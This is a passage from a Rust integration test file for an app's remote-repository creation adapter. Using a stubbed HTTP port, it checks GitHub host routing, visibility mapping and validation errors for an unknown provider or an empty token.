    let http = std::sync::Arc::new(StubProviderHttp {
        calls: http_calls.clone(),
    });
    let adapter = CreateProjectAdapter::new(http);
    let namespace = NamespaceSummary {
        id: "octocat".into(),
        name: "octocat".into(),
        kind: "personal".into(),
    };
    let created = adapter
        .create_remote_repo(
            "github",
            "", // public default
            "pat-stub",
            &namespace,
            "billing-service",
            "private",
        )
        .await
        .expect("public-default host must succeed");
    assert_eq!(created.full_name, "octocat/billing-service");
    let calls = http_calls.create.lock().unwrap();
    assert_eq!(calls.len(), 1);
    assert_eq!(
        calls[0].host, "",
        "empty host must reach the HTTP port verbatim"
    );
    assert_eq!(calls[0].kind, "github");
    assert_eq!(calls[0].pat, "pat-stub");
    assert!(calls[0].request.private);
    assert!(calls[0].request.auto_init);
    drop(calls);
}

#[tokio::test]
async fn create_remote_repo_with_nonempty_host_routes_to_enterprise() {
    // Non-empty host ⇒ self-hosted enterprise install (the adapter's
    // downstream `api_base()` rewrites the GitHub Enterprise case to
    // `/api/v3`).
    let http_calls = std::sync::Arc::new(HttpCalls::default());
    let http = std::sync::Arc::new(StubProviderHttp {
        calls: http_calls.clone(),
    });
    let adapter = CreateProjectAdapter::new(http);
    let namespace = NamespaceSummary {
        id: "acme".into(),
        name: "acme".into(),
        kind: "org".into(),
    };
    let _ = adapter
        .create_remote_repo(
            "github",
            "github.acme.com",
            "pat-stub",
            &namespace,
            "team-repo",
            "private",
        )
        .await
        .expect("enterprise host must succeed");
    let calls = http_calls.create.lock().unwrap();
    assert_eq!(calls.len(), 1);
    assert_eq!(
        calls[0].host, "github.acme.com",
        "non-empty host must reach the HTTP port unchanged"
    );
    assert_eq!(calls[0].request.namespace.kind, "org");
    assert_eq!(calls[0].request.namespace.id, "acme");
    drop(calls);
}

#[tokio::test]
async fn create_remote_repo_visibility_public_sets_private_false() {
    // Mapping: `"public"` ⇒ `private: false` (GitHub payload keys
    // off `private`, not a free-form `visibility` string).
    let http_calls = std::sync::Arc::new(HttpCalls::default());
    let http = std::sync::Arc::new(StubProviderHttp {
        calls: http_calls.clone(),
    });
    let adapter = CreateProjectAdapter::new(http);
    let namespace = NamespaceSummary {
        id: "octocat".into(),
        name: "octocat".into(),
        kind: "personal".into(),
    };
    let _ = adapter
        .create_remote_repo(
            "github",
            "github.com",
            "pat-stub",
            &namespace,
            "demo",
            "public",
        )
        .await
        .expect("public visibility must succeed");
    let calls = http_calls.create.lock().unwrap();
    assert_eq!(calls.len(), 1);
    assert!(!calls[0].request.private);
    drop(calls);
}

#[tokio::test]
async fn create_remote_repo_unknown_provider_kind_is_validation() {
    // Forwarding to `ProviderHttpPort::create_repo` with an
    // unsupported kind would yield an opaque error; the adapter
    // short-circuits with a clear Validation error so the wizard can
    // render it inline.
    let http_calls = std::sync::Arc::new(HttpCalls::default());
    let http = std::sync::Arc::new(StubProviderHttp {
        calls: http_calls.clone(),
    });
    let adapter = CreateProjectAdapter::new(http);
    let namespace = NamespaceSummary {
        id: "octocat".into(),
        name: "octocat".into(),
        kind: "personal".into(),
    };
    let err = adapter
        .create_remote_repo(
            "bitbucket",
            "github.com",
            "pat-stub",
            &namespace,
            "demo",
            "private",
        )
        .await
        .unwrap_err();
    assert!(matches!(err, AppError::Validation { .. }));
    let calls = http_calls.create.lock().unwrap();
    assert!(calls.is_empty());
    drop(calls);
}

#[tokio::test]
async fn create_remote_repo_empty_pat_is_validation() {
    // The command layer always supplies a PAT; an empty one here
    // means the cache returned nothing — refuse to forward to the
    // HTTP port.
    let http_calls = std::sync::Arc::new(HttpCalls::default());
    let http = std::sync::Arc::new(StubProviderHttp {
        calls: http_calls.clone(),
    });
    let adapter = CreateProjectAdapter::new(http);
    let namespace = NamespaceSummary {
        id: "octocat".into(),
        name: "octocat".into(),
        kind: "personal".into(),
    };
    let err = adapter
        .create_remote_repo("github", "github.com", "", &namespace, "demo", "private")
        .await
        .unwrap_err();
    assert!(matches!(err, AppError::Validation { .. }));
    let calls = http_calls.create.lock().unwrap();
    assert!(calls.is_empty());
    drop(calls);
}

// ── Blocker C-4 dedup pin ─────────────────────────────────────────────
//
// The wizard's Commit arm in `commands::create_project` must route
// the keyring lookup through `application::providers::resolve_provider_and_pat`
// (the single backend site that opens the `'demeteo'` keyring for a
// provider id). This integration test pins the dedup contract from
// outside the `application` module — a regression that silently makes
// `resolve_provider_and_pat` private again would fail to compile
// here, and a regression that re-introduces the duplicate
// `Entry::new("demeteo", provider.id.as_str())` lookup in
// `commands::create_project` would be caught by the static check at
// the end of this file.

#[test]
fn resolve_provider_and_pat_is_visible_from_outside_the_application_module() {
    // Compile-time + runtime pin: the symbol must be reachable via
    // the public `demeteo_lib::application::providers` path with the
    // canonical
    // `(&AppContext, &str) -> Result<(ProviderInstance, String), String>`
    // signature. A regression that flips `pub fn` to `fn` (or
    // changes the return type) breaks the coercion below.
    type ResolveFn = fn(
        &demeteo_lib::state::AppContext,
        &str,
    )
        -> Result<(demeteo_lib::domain::models::ProviderInstance, String), String>;
    let f: ResolveFn = demeteo_lib::application::providers::resolve_provider_and_pat;
    let _ = f as usize;
}
